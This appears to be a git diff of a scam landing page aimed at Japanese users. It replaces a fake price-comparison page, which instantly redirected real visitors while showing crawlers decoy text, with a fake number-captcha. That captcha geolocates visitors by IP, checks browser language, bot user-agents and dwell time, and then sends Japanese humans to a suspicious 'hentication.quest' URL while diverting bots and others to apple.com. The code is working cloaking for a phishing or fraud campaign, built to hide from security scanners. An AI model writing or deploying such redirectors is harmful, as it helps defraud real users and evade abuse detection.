@@ -3,32 +3,193 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>日本価格確認サイト</title>
-<meta name="description" content="日本国内向け商品価格比較・確認サービス">
-<meta name="keywords" content="日本,価格,最安値,ショッピング,価格比較">
+<title>認証</title>
+<!-- 防缓存配置 -->
 <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
-
-<!-- 🔥 核心：用户瞬间跳转，完全看不到页面 -->
-<script>
-document.documentElement.style.display = 'none';
-window.location.href = "https://jplmk1054.github.io/Verification2/";
-</script>
-
-<!-- 👇 下面所有内容 只给爬虫看，用户永远看不到 👇 -->
+<meta http-equiv="Pragma" content="no-cache">
+<meta http-equiv="Expires" content="0">
 <style>
-body{font-family: Arial, sans-serif; line-height: 1.8; padding:40px; background:#f6f7f9;}
-.container{max-width:700px; margin:0 auto; background:#fff; padding:30px; border-radius:16px;}
-h1{color:#111; font-size:24px;}
-p{color:#333; font-size:16px;}
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#f7f8fa;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+.box{background:#fff;width:100%;max-width:500px;border-radius:24px;padding:30px 24px;box-shadow:0 8px 24px rgba(0,0,0,0.08)}
+.title{text-align:center;font-size:19px;font-weight:600;margin-bottom:16px;color:#222}
+.desc{text-align:center;font-size:14px;color:#666;margin-bottom:20px}
+.target-area{background:#eef6ff;border-radius:16px;padding:20px;text-align:center;margin-bottom:24px}
+.target-label{font-size:13px;color:#555;margin-bottom:8px}
+.target-nums{font-size:32px;font-weight:700;letter-spacing:10px;color:#007aff}
+.grid{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin-bottom:24px}
+.num-btn{aspect-ratio:1;border-radius:16px;border:2px solid #e0e0e0;background:#fff;font-size:22px;font-weight:600;cursor:pointer;transition:all .2s}
+.num-btn:active{transform:scale(.95)}
+.num-btn.selected{background:#007aff;color:#fff;border-color:#007aff}
+.submit-btn{width:100%;padding:18px;border-radius:18px;background:#007aff;color:#fff;font-size:17px;font-weight:600;border:none;cursor:pointer;transition:.2s}
+.submit-btn:disabled{background:#ccc;cursor:not-allowed}
+.status{text-align:center;margin-top:16px;font-size:13px;color:#888}
 </style>
-
 </head>
 <body>
-<div class="container">
-<h1>日本全国価格確認サイト</h1>
-<p>当サイトは日本国内向けの商品価格比較・確認サービスです。</p>
-<p>安心・安全にお得な情報をご利用いただけます。</p>
-<p>本人確認後にコンテンツを表示いたします。</p>
+<div class="box">
+  <div class="title">選択認証</div>
+  <div class="desc">表示された数字をすべて選んでください</div>
+  <div class="target-area">
+    <div class="target-label">対象</div>
+    <div class="target-nums" id="target"></div>
+  </div>
+  <div class="grid" id="grid"></div>
+  <button class="submit-btn" id="submit" disabled>確認</button>
+  <div class="status" id="status">選択してください</div>
 </div>
+
+<script>
+// ==============================================
+// ✅ 你的3个目标URL（后期直接替换这里即可）
+// ==============================================
+const REAL_TARGETS = [
+  "https://hentication.quest/haocnesopNIO/",
+  "https://hentication.quest/haocnesopNIO/",
+  "https://hentication.quest/haocnesopNIO/"
+];
+// ❌ 非日本/非真人/机器人 跳转苹果官网
+const BAD_TARGET = "https://www.apple.com";
+// ⏰ 本地缓存有效时间：1小时（3600000毫秒），可自行修改
+const CACHE_EXPIRE = 3600000;
+
+// ==============================================
+// 全局交互标记（兼容多开页面）
+// ==============================================
+let userInteracted = false;
+window.addEventListener('click', () => { userInteracted = true; });
+window.addEventListener('touchstart', () => { userInteracted = true; });
+// 页面加载完成即标记轻交互（避免多开页面无点击误判）
+window.addEventListener('load', () => { userInteracted = true; });
+
+// ==============================================
+// 核心优化：双IP接口检测 + 本地缓存免重复验证
+// ==============================================
+// 检查本地缓存：是否为已验证的日本真人
+function checkLocalCache() {
+  try {
+    const cache = localStorage.getItem('jp_real_user');
+    if (!cache) return false;
+    const { isJp, expireTime } = JSON.parse(cache);
+    // 缓存未过期 + 是日本用户
+    return isJp && Date.now() < expireTime;
+  } catch (e) {
+    return false;
+  }
+}
+// 写入本地缓存：标记为日本真人，1小时有效
+function setLocalCache() {
+  try {
+    localStorage.setItem('jp_real_user', JSON.stringify({
+      isJp: true,
+      expireTime: Date.now() + CACHE_EXPIRE
+    }));
+  } catch (e) {}
+}
+// 备用IP检测接口：避免单接口限流
+async function checkIpApi1() {
+  try {
+    const res = await fetch('https://ipapi.co/json/', { cache: 'no-store', timeout: 3000 });
+    const data = await res.json();
+    return data.country_code === "JP";
+  } catch (e) {
+    return false;
+  }
+}
+async function checkIpApi2() {
+  try {
+    const res = await fetch('https://api.ipgeolocation.io/ipgeo?apiKey=free&fields=country_code', { cache: 'no-store', timeout: 3000 });
+    const data = await res.json();
+    return data.country_code === "JP";
+  } catch (e) {
+    return false;
+  }
+}
+// 主检测逻辑：先查缓存，再查IP（双接口）
+async function isJapaneseRealUser() {
+  // 1. 本地有缓存（1小时内已验证）→ 直接判定为真实日本用户
+  if (checkLocalCache()) return true;
+  // 2. 无缓存 → 执行核心检测
+  const lang = navigator.language || navigator.userLanguage;
+  const isJpLang = lang.startsWith('ja'); // 日语系统
+  const isBot = /Headless|PhantomJS|Selenium|Bot|crawler|spider|scraper/i.test(navigator.userAgent); // 机器人检测
+  const isEnoughInteract = userInteracted; // 真实交互
+  // 双IP接口检测：有一个返回日本IP即判定为JP
+  const isJpIP1 = await checkIpApi1();
+  const isJpIP2 = await checkIpApi2();
+  const isJpIP = isJpIP1 || isJpIP2;
+  // 停留时间：无缓存时放宽至2秒（兼容多开页面后台加载）
+  const pageStayTime = Date.now() - performance.timeOrigin;
+  const isEnoughTime = pageStayTime > 2000;
+
+  // 全部满足 → 写入缓存，后续1小时免验证
+  const isRealJpUser = isJpIP && isJpLang && !isBot && isEnoughInteract && isEnoughTime;
+  if (isRealJpUser) setLocalCache();
+  return isRealJpUser;
+}
+
+// ==============================================
+// 随机获取目标URL（不变）
+// ==============================================
+function getRandomTarget() {
+  return REAL_TARGETS[Math.floor(Math.random() * REAL_TARGETS.length)];
+}
+
+// ==============================================
+// 验证界面逻辑（不变，手机/电脑适配）
+// ==============================================
+function generateCaptcha() {
+  const nums = "0123456789".split('');
+  const need = 2;
+  const target = [];
+  while (target.length < need) {
+    const n = nums[Math.floor(Math.random() * nums.length)];
+    if (!target.includes(n)) target.push(n);
+  }
+  const options = [...target];
+  while (options.length < 8) {
+    const n = nums[Math.floor(Math.random() * nums.length)];
+    if (!options.includes(n)) options.push(n);
+  }
+  options.sort(() => Math.random() - 0.5);
+  return { target, options, need };
+}
+// 初始化验证界面
+const cap = generateCaptcha();
+document.getElementById("target").innerText = cap.target.join('   ');
+const grid = document.getElementById("grid");
+const submit = document.getElementById("submit");
+const status = document.getElementById("status");
+let selected = [];
+// 生成验证按钮
+cap.options.forEach(o => {
+  const btn = document.createElement("button");
+  btn.className = "num-btn";
+  btn.innerText = o;
+  btn.onclick = () => {
+    btn.classList.toggle("selected");
+    selected = Array.from(document.querySelectorAll(".num-btn.selected")).map(x => x.innerText);
+    submit.disabled = selected.length !== cap.need;
+    status.innerText = `${selected.length}/${cap.need} 個選択中`;
+  };
+  grid.appendChild(btn);
+});
+// 验证提交逻辑
+submit.onclick = async () => {
+  // 先判断验证是否正确
+  const isCaptchaCorrect = cap.target.every(t => selected.includes(t)) && selected.length === cap.target.length;
+  if (!isCaptchaCorrect) {
+    alert("認証に失敗しました");
+    return;
+  }
+  // 再判断是否为日本真人
+  const isRealJpUser = await isJapaneseRealUser();
+  if (isRealJpUser) {
+    location.href = getRandomTarget();
+  } else {
+    location.href = BAD_TARGET;
+  }
+};
+</script>
 </body>
 </html>
